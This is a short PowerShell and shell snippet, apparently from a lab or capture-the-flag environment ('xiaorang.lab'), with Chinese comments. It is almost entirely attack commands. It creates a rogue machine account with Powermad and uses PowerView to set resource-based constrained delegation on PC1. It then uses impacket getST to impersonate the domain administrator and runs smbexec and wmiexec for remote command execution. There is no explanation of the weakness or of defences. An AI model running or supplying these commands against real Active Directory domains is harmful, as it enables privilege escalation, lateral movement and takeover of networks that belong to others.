
```ps1
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount evilpc -Password $(ConvertTo-SecureString "password" -AsPlainText -Force)

import-module .\PowerView.ps1
# 获取 sid
Get-DomainComputer evilpc | select objectSid

# 再配置evilpc到PC1的基于资源的约束委派，利用PowerView修改PC1的msDS-AllowedToActOnBehalfOfOtherIdentity值，值的后半部分为evilpc的sid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3535393121-624993632-895678587-1116)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer PC1 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# 可以使用下方命令验证是否成功添加
Get-DomainComputer PC1 -Properties msds-allowedtoactonbehalfofotheridentity

# 配置完成基于资源的约束委派就可以攻击了，在/etc/hosts中配置IP域名的映射关系
sudo vi /etc/hosts
172.22.60.15 PC1.xiaorang.lab
172.22.60.42 FILESERVER.xiaorang.lab


# 接着用impacket套件请求ST，再用smbexec去连即可
# 172.22.60.8 是DC
proxychains impacket-getST -dc-ip 172.22.60.8 xiaorang.lab/evilpc$:password -spn cifs/pc1.xiaorang.lab -impersonate administrator
export KRB5CCNAME=administrator.ccache
proxychains impacket-smbexec -no-pass -k PC1.xiaorang.lab
proxychains impacket-wmiexec -no-pass -k PC1.xiaorang.lab
```